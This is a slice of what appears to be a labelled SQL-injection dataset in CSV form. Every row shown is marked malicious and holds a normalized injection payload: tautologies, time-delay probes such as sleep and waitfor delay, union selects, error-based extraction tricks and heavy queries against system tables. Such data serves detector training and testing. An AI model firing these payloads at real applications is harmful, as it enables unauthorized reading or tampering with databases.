row_index,payload_norm,label,sqli_type_hint
3720,1%' ) ) and 9198 = 9198--,1,
3721,-8301' ) ) ) or ( 5708 = 5268 ) *5268 and ( ( ( 'hkha' = 'hkha,1,
3722,"-9698' ) ) as qnjv where 3360 = 3360 or make_set ( 9354 = 9354,7185 ) --",1,
3723,"1"" ) ) as aozi where 3354 = 3354 waitfor delay '0:0:5'--",1,
3724,"1 ) ) as xebl where 3105 = 3105 or 8421 = ( select count ( * ) from generate_series ( 1,5000000 ) ) --",1,
3725,1' and ( 3020 = 3020 ) *6703,1,
3726,1' ) ) ) and sleep ( 5 ) and ( ( ( 'hwjy' = 'hwjy,1,
3727,"1"" ) ) or ( select * from ( select ( sleep ( 5 ) ) ) sddo ) #",1,
3728,"make_set ( 2672 = 2672,5440 )",1,
3729,1' ) ) ) and 6969 = ( select 6969 from pg_sleep ( 5 ) ) and ( ( ( 'ineq' like 'ineq,1,
3730,"1 procedure analyse ( extractvalue ( 9255,concat ( 0x5c, ( benchmark ( 5000000,md5 ( 0x52515a50 ) ) ) ) ) ,1 ) -- wvjy",1,
3731,1 ) as odqn where 3910 = 3910,1,
3732,-8945 ) ) as fszo where 2320 = 2320 union all select 2320--,1,
3733,"-5097' ) union all select 8992,8992,8992,8992,8992,8992,8992,8992,8992--",1,
3734,"1', ( select ( case when ( 5777 = 5777 ) then 1 else cast ( 1 as int ) / ( select 0 from dual ) end ) from dual )",1,
3735,"1' ) ) as arhm where 3268 = 3268 or ( select 2* ( if ( ( select * from ( select concat ( 0x7171706a71, ( select ( elt ( 8113 = 8113,1 ) ) ) ,0x717a767a71,0x78 ) ) s ) , 8446744073709551610, 8446744073709551610 ) ) ) --",1,
3736,"1 or 2367 = ( select count ( * ) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 ) --",1,
3737,"-5190%"" or 8298 = 9306 and ""%"" = """,1,
3738,"1%"" ) ) ) or 7417 = ( select count ( * ) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 ) --",1,
3739,"1"" ) or 8514 = benchmark ( 5000000,md5 ( 0x544d5a4c ) ) #",1,
3740,"1"" ) or 7417 = ( select count ( * ) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 ) --",1,
3741,"1 ) and 3707 = ( select count ( * ) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 ) and ( 9509 = 9509",1,
3742,1' ) or sleep ( 5 ),1,
3743,"1"" or row ( 1045,7562 ) > ( select count ( * ) ,concat ( 0x7171706a71, ( select ( elt ( 1045 = 1045,1 ) ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) x from ( select 8488 union select 5584 union select 3051 union select 1210 ) a group by x ) and ""xmvr"" = ""xmvr",1,
3744,"1"" where 4597 = 4597 rlike sleep ( 5 ) --",1,
3745,1'|| ( select 'aojt' from dual where 8499 = 8499,1,
3746,"1'|| ( select 'goxu' where 9215 = 9215 and char ( 109 ) ||char ( 79 ) ||char ( 70 ) ||char ( 90 ) = regexp_substring ( repeat ( right ( char ( 5012 ) ,0 ) ,5000000000 ) ,null ) --",1,
3747,"1"" rlike sleep ( 5 ) #",1,
3748,"1"" ) as hoiv where 9708 = 9708 and exp ( ~ ( select * from ( select concat ( 0x7171706a71, ( select ( elt ( 8190 = 8190,1 ) ) ) ,0x717a767a71,0x78 ) ) x ) ) --",1,
3749,"1'+ ( select 'aliz' where 5050 = 5050 or 4411 = ( select count ( * ) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7 ) ) +'",1,
